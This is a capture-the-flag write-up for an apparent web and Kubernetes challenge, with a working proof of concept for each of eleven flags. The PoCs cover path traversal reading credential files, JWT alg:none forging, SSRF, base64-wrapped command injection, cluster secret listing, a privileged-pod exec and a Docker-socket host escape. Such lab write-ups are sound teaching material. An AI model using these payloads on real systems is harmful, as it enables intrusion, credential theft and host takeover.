# Break the SaaS — Technical Writeup

A full walkthrough of how each of the eleven flags in the `ctf.seoeh.ir` challenge
was obtained. Every flag was captured by chaining a small set of realistic web and
Kubernetes misconfigurations, starting from a public Django API and ending with
root on the host machine that runs the cluster.

The challenge is a multi-tenant "internal SaaS" demo: a Django + DRF backend with
a ping diagnostic tool, a webhook tester, audit reports, JWT authentication, and a
background worker that talks to the Kubernetes API. The cluster itself is a `kind`
cluster, which is important later.

For each flag below I describe the underlying vulnerability, why it is
exploitable, the exact steps I took, and a reproducible proof-of-concept. Flag
values are intentionally omitted.

---

## F1 — Docker layer leak (`.env` in an intermediate image layer)

### Vulnerability
The backend image is published to a public Harbor registry. During the build, a
file with a secret value was copied into the image and then deleted with
`RUN rm`. Deleting a file in Docker only adds a whiteout layer — the bytes
remain in the earlier layer that performed the `COPY`. Anyone who can pull the
image and unpack its layers can recover the deleted file. This is the classic
"docker layers never forget" problem.

### Extraction
I obtained an anonymous pull token from the registry, listed the image tags,
pulled the manifest, and downloaded the layer blobs. Iterating over the layers,
one small blob contained the deleted `.env` file. Extracting that single layer
with `tar` revealed the file exactly as it was copied in the build.

### PoC
```bash
TOK=$(curl -sk "https://hub.hamdocker.ir/v2/token?service=harbor-registry&scope=repository:seoeh/hamamooz_challlenges:pull" \
     | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')

curl -sk -H "Authorization: Bearer $TOK" \
  "https://hub.hamdocker.ir/v2/seoeh/hamamooz_challlenges/tags/list"

# pull the manifest, download the layer blob that holds /app/.env, then:
tar xzf <layer>.tar.gz
cat app/.env            # the flag, left behind in the layer
```

---

## F2 — Swagger/OpenAPI schema exposure

### Vulnerability
`drf-spectacular` serves the full API schema at `/api/schema/` and `/swagger.json`.
The routes are hidden from the UI and disallowed in `robots.txt`, but the schema
endpoint itself requires no authentication. Beyond leaking every route, the schema
carries a flag inside the API `info.description` field, presumably so that
anyone who finds the schema is rewarded.

### Extraction
Simply fetched the schema. The flag was sitting in the OpenAPI document's
description, and the same document conveniently revealed the hidden
`/api/internal/flag` route that we used next.

### PoC
```bash
curl -sk https://ctf.seoeh.ir/api/schema/      # also: /swagger.json
# grep for the flag inside info.description
```

---

## F3 — Unauthorized debug endpoint (header-gated)

### Vulnerability
`/api/internal/flag` is a hidden route that returns a flag whenever the request
carries `X-Debug-Mode: true`. There is no authentication, the only gate is the
header value. It was clearly meant to be removed before production (a comment in
the frontend even says so), but the route and its intent are discoverable from the
Swagger schema.

### Extraction
Sent the debug header to the endpoint. The flag came back in the JSON response.

### PoC
```bash
curl -sk -H "X-Debug-Mode: true" https://ctf.seoeh.ir/api/internal/flag
# {"flag": "<flag>"}
```

---

## F4 — Path traversal / arbitrary file read

### Vulnerability
`/api/reports/download?file=...` joins the user-supplied `file` parameter onto
`/app/reports/` with `os.path.join` and then reads whatever path results. There is
no normalization, so `../` sequences escape the reports directory. The endpoint
also lists directories when the resolved path is a folder, which made
reconnaissance trivial.

### Extraction
I listed `/app` first with `file=..`, spotted a `flag.txt` next to the reports,
and read it directly with `file=../flag.txt`. From there the same primitive
became an arbitrary file read: reading `/proc/1/environ` leaked every environment
variable (including the JWT secret and several flag values), and reading the
Kubernetes service-account token file gave us the credential used by the cluster
steps later in this writeup.

### PoC
```bash
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=.."          # list /app
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../flag.txt" # flag
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../proc/1/environ" \
  | tr '\0' '\n'                                                      # env leak
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token"
```

---

## F5 — IDOR (cross-tenant report read)

### Vulnerability
`/api/orgs/<org_id>/reports/<report_id>` returns the report including its
`secret_note` with no ownership or tenant check, and the view is marked
`AllowAny`, no authentication at all. The seed script stored one flag inside the
`secret_note` of Org 2's report, so asking for that report by ID returns it to
anyone, logged in or not.

### Extraction
Called the endpoint with the org/report identifiers for the seeded "Globex"
tenant. The response contained the title and the secret note, which was the flag.
The other org's report was a decoy value, confirming the data is tenant-scoped by
convention only.

### PoC
```bash
curl -sk https://ctf.seoeh.ir/api/orgs/2/reports/2
# {"title": "Globex Internal Audit", "secret_note": "<flag>"}
```

---

## F6 — JWT `alg:none` / weak HS256 secret

### Vulnerability
The custom JWT `decode()` helper reads the token header with
`get_unverified_header`. If the header says `alg: none`, it decodes the payload
without verifying any signature. That means anyone can mint a token with
`role: admin` and pass the `/admin/dashboard` check. As a second route, the HS256
secret used by the app is a well-known default value (`changeme123`), which the
path-traversal env leak had already exposed anyway, so a properly signed token was
also forgeable.

### Extraction
I built a JWT with an unsigned header/payload pair (`alg: none`, `role: admin`),
sent it as a Bearer token to `/admin/dashboard`, and received the flag. The same
result is achievable by signing the payload with the leaked secret.

### PoC
```bash
TOKEN=$(python3 - <<'EOF'
import base64,json
def b(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"1","role":"admin"})+".")
EOF
)
curl -sk -H "Authorization: Bearer $TOKEN" https://ctf.seoeh.ir/admin/dashboard
# {"flag": "<flag>"}
```

---

## F7 — SSRF into the internal network

### Vulnerability
The webhook tester (`/api/webhooks/test`) takes a `url`, a `method`, and optional
`headers`, and performs the request server-side with TLS verification disabled
and no destination allowlist. It returns the response body. The backend's own
worker code reveals an internal service name
(`admin-panel.internal-tools.svc.cluster.local`) that is only reachable from
inside the cluster.

### Extraction
Pointed the webhook at the internal admin panel. The response was the panel's
HTML, which contained the flag in an HTML comment. This was the first proof that
the webhook gives us free reach into cluster-internal services.

### PoC
```bash
curl -sk -X POST https://ctf.seoeh.ir/api/webhooks/test -H "Content-Type: application/json" \
  -d '{"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET"}'
# <h1>Admin Panel</h1> ... <!-- <flag> -->
```

---

## F8 — Service-account token leak and cluster-wide secret read

### Vulnerability
The backend pod runs with a Kubernetes service account whose role grants
`get/list/watch` on all resources cluster-wide (a "cluster reader"). The account's
token file is world-readable inside the pod, and we already have arbitrary file
read (F4) plus command execution (F9). With that token, the Kubernetes API happily
lists every secret in the cluster — including a dedicated flag secret.

### Extraction
First I leaked the token through the path-traversal file read. I then queried the
Kubernetes API from inside the pod (using the command injection to run a small
Python script, since the webhook's SSRF is limited to 3-second requests and no
body). Listing `/api/v1/secrets` returned a `flag-secret` whose data field was a
base64-encoded flag; decoding it gave the value. A permissions review
(`SelfSubjectRulesReview`) confirmed the broad read scope and that `pods/exec`
was allowed in the `escape-zone` namespace — which we need next.

### PoC
```bash
# 1. leak the SA token (via F4)
TOKEN=$(curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token")

# 2. run python in the backend pod (via F9) to list secrets
INNER='python3 - <<"PY"
import urllib.request,json,base64,ssl
ctx=ssl._create_unverified_context()
tok=open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
req=urllib.request.Request("https://kubernetes.default.svc/api/v1/secrets",
                           headers={"Authorization":"Bearer "+tok})
d=json.load(urllib.request.urlopen(req,context=ctx,timeout=10))
for it in d["items"]:
    if "flag" in (it.get("data") or {}):
        print(base64.b64decode(it["data"]["flag"]).decode())
PY'
B64=$(printf '%s' "$INNER" | base64 | tr -d '\n')
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H 'Content-Type: application/json' \
  -d "{\"host\":\"127.0.0.1; echo $B64 | base64 -d | sh\"}"
```

---

## F9 — Command injection in the ping tool

### Vulnerability
`/api/diag/ping` builds a shell command by concatenating the user-supplied `host`
value directly: `subprocess.run(f"ping -c 2 {host}", shell=True, ...)`. There is
no validation, so a semicolon followed by any command is executed by the shell,
and the command's stdout is returned in the JSON response. This is full remote
code execution inside the backend pod and became the transport for every cluster
step that followed.

### Extraction
I injected a `cat` of a file whose path was already visible in the decompiled
backend (a constant in the ping view). The flag was in the command output. The
same injection was then reused to run Python and `kubectl` for the Kubernetes
steps.

### PoC
```bash
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
# {"output": "<flag>"}
```

---

## F10 — Privileged pod escape (hostPath `/`)

### Vulnerability
The `escape-zone` namespace runs a deliberately misconfigured pod,
`legacy-worker`: it is `privileged: true` and mounts the node's root filesystem
at `/host` via a `hostPath: /` volume. Its init container even writes a flag file
to the node's `/var/lib/node-data/`. Our service account has `pods/exec` (create)
permission in that namespace, so we can exec into the pod and read any file on the
node through the mount, including the flag the init container placed.

### Extraction
With the leaked token, I asked the API for the pod list in `escape-zone` and saw
the privileged pod and its init-container command, which revealed exactly where
the flag lives on the node. Then, from the backend pod's shell (via F9), I ran
`kubectl` with the mounted token to exec into `legacy-worker` and read
`/host/var/lib/node-data/flag.txt` — the hostPath mount makes the node's path
appear under `/host` inside the pod.

### PoC
```bash
# exec into the privileged pod and read the host file (kubectl is in the image)
INNER='TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); kubectl \
  --server=https://kubernetes.default.svc --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt'
B64=$(printf '%s' "$INNER" | base64 | tr -d '\n')
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H 'Content-Type: application/json' \
  -d "{\"host\":\"127.0.0.1; echo $B64 | base64 -d | sh\"}"
```

---

## F11 — Docker socket escape to the host VM

### Vulnerability
The cluster is a `kind` cluster, and kind runs every node as a Docker container
with the host's Docker socket mounted into the node at `/var/run/docker.sock`.
From inside `legacy-worker` the node root appears at `/host`, so the socket is
reachable at `/host/run/docker.sock`. The Docker daemon behind that socket runs
on the actual VM host, and with the socket you can create any container, in
particular one that bind-mounts the host's root filesystem. The final flag was
written to the host's `/home/ubuntu/flag.txt` by the challenge's own deployment
script, so it lives on the host filesystem, not inside any container or pod.

### Extraction
Inside `legacy-worker` I used `curl --unix-socket` to talk to the Docker API. I
listed the running containers (the three kind nodes) and the available images,
then created a throwaway container from an existing image (`ctf/backend:latest`),
running as root (`"User":"0"`) with the host root mounted read-write
(`"Binds":["/:/host"]`). Its command was a simple `cat` of the flag path on the
host. After starting it, I read the container logs, which contained the flag. As
a bonus, the same mount let me copy out the challenge author's entire source
directory, including the official writeup.

### PoC
```bash
# run inside legacy-worker (reached via the F9 injection + kubectl exec):
S=/host/run/docker.sock
curl -s --unix-socket $S -X POST -H "Content-Type: application/json" \
  -d '{"Image":"ctf/backend:latest","User":"0",
       "HostConfig":{"Binds":["/:/host"]},
       "Cmd":["sh","-c","cat /host/home/ubuntu/flag.txt"]}' \
  "http://localhost/v1.41/containers/create?name=esc"
curl -s --unix-socket $S -X POST "http://localhost/v1.41/containers/esc/start"
curl -s --unix-socket $S "http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1"
# logs contain the flag
```

---

The chain is a good reminder that these issues compound: a schema leak reveals a
hidden route, a file-read becomes a credential leak, a ping tool becomes a shell,
and a privileged pod becomes the Docker daemon, which on a kind cluster, is the
host itself.
